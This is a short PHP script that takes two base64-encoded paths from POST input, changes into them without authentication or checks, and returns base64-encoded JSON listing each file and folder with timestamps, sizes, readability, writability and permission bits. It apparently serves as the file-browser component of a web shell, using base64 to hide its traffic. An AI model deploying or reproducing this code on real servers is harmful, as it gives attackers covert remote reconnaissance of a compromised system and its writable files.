<?php

$result = array();


$pth1 = base64_decode($_POST['d_pth1']);
$pth2 = base64_decode($_POST['d_pth2']);

chdir($pth1);
chdir($pth2);

$result["cwd"] = getcwd();


$o = opendir(".");
$result['files'] = array();
$result['folders'] = array();

$filename='..';
$one = array();
$one['modified'] = @date("Y-m-d H:i:s",filectime($filename));
$one['filename'] = $filename;
$one['is_readable'] = is_readable($filename);
$one['is_writeable'] = is_writeable($filename);
$one['filename'] = $filename;
$one['perms'] = substr(sprintf('%o', fileperms($filename)), -4);
$result['folders'][] = $one;

while (true) {
    $filename = readdir($o);
    if ($filename == '.')
        continue;
	if ($filename == '..')
        continue;
    if (!$filename)
        break;
	if (is_null($filename))
        break;
    $one = array();
    $one['modified'] = @date("Y-m-d H:i:s",filectime($filename));
    $one['filename'] = $filename;
	if(!is_dir($filename))$one['size']=filesize($filename);
    $one['is_readable'] = is_readable($filename);
    $one['is_writeable'] = is_writeable($filename);
    $one['filename'] = $filename;
    $one['perms'] = substr(sprintf('%o', fileperms($filename)), -4);
    if (is_dir($filename)) {
        $result['folders'][] = $one;
    } else {
        $result['files'][] = $one;
    }
}


echo base64_encode(json_encode($result));
